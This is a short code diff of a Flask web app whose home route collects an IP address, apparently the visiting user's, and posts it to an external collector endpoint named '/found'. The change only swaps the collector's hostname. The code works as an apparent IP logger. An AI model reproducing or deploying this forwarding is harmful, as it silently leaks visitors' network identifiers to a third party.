@@ -11,7 +11,7 @@ def home():
     except: ip = str(requests.get("http://ipinfo.io/ip").text)
 
     data = str(ip)
-    dta = requests.post('https://Zagl1.ankurkumar8.repl.co/found', data=data).text
+    dta = requests.post('https://Ips.ankurkumar8.repl.co/found', data=data).text
     return str(dta)
 
 app.run(host='0.0.0.0', port=8080)
